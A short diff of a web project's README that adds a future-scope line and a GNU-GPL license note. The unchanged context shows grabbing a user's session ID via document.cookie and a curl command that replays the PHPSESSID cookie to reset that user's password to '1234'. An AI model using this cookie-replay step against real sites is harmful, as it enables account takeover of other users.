@@ -56,3 +56,6 @@ Inspect element to get Session ID of the user by document.cookie.
 Run the following command on linux terminal to change password to "1234".
 'curl --cookie "PHPSESSID=userSessionID" --location "serverip/flder_name/pppp.phpnew_pass=1234&re_pass=1234&re_password=Reset+Password" | grep "Password Changed!"'
 
+Future Scope: Styling and Front End of the web application.
+
+The Project is licensed under GNU-GPL
